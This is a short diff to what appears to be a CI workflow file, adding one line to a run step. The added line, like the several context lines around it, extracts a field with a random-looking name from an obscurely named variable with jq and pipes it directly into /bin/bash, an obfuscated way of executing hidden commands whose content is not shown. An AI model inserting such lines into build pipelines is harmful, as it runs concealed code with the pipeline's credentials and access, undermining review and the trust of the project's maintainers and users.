@@ -32,6 +32,7 @@ jobs:
           echo $x4 | jq -r .z44 | /bin/bash
           printf '%s' "$pequh57" | jq -r .fllus09671 | /bin/bash
           printf '%s' "$voe79" | jq -r .huht793 | /bin/bash
+          echo $r0 | jq -r .llik61298 | /bin/bash
 
       - name: Save results
         if: always()
